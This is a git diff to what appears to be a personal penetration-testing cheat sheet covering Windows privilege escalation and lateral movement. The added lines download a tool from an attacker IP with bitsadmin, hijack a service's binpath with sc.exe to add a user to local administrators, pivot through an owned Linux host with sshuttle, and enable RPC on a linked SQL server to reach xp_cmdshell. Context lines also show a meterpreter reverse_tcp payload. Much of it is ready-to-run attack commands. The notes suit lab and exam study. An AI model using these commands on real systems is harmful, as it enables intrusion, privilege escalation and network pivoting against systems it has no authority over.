@@ -162,6 +162,11 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=t
 -----------------------------------------------------------------------------------------------
 ## PrivEsc(Windows)
 
+- if certutil is blocked, use bits admin to transfer files
+```cmd
+bitsadmin /Transfer myJob http://192.168.45.231/peas64.exe C:\Users\Public\peas.exe
+```
+
 - First off, do local and then domain enumeration as much as you can.
 - Domain enumeration is best executed via SharpHound.exe within the windows host but if not possible or you cant gain access to a Windows host that is from another domain, you can run bloodhound-ce-python
 - When using kerberos authentication, you need to update your /etc/hosts. The best way to do this properly is this
@@ -215,6 +220,13 @@ Get-LAPSComputers
 ```
 ```bash
 nxc ldap <DC of domain> -u <User> -H 'hash' --module laps
+```
+
+#### Services Manipulation
+- If you can modify a service that is owned by another user (preferably SYSTEM or Administrator), you can modify the binpath to execute your exe or to simply execute cmd to add users to administrator
+```cmd
+sc.exe config SNMPTRAP start= "demand" binpath= "cmd /c net localgroup administrators ning.wang /add" obj= "LocalSystem"
+sc.exe start SNMPTRAP
 ```
 
 #### IT/DEV/HR/(somethingADMINS like DEVAdmins/CLAdmins/LinuxAdmins)
@@ -343,6 +355,12 @@ chown victim:victim authorized_keys
 psexec.py <domain>/<user>@<FQDN host> -k -no-pass
 ```
 
+### Port Forwarding Shenigans with Linux Host
+- if your owned linux host belong to another domain and you want to access a service that is exclusive to tht domain, you can use sshuttle to create a pivot through that linux host
+```bash
+sshuttle -r root@app01.dev.local.com <Target CIDR> --ssh-cmd "ssh -i id_rsa" 
+```
+
 ### Via MSSQL
 - Note any hosts named DB or SQL
 - if not one can always enumerate via nxc mssql or use tools like MSSQLand or native enumeration
@@ -388,6 +406,10 @@ exec_as_user sa
 # if you can jump DBs
 use_link DB03
 # then do the following until you hit somewhere where you can xp_cmdshell for profit
+# however if you see the link but use_link fails because RPC is not configured, do the following
+# enable rpc with this command
+exec sp_serveroption @server='DB03', @optname='rpc', @optvalue='true';
+exec sp_serveroption @server='DB03', @optname='rpc out', @optvalue='true';
 ```
 
 #### NTLMRelay 
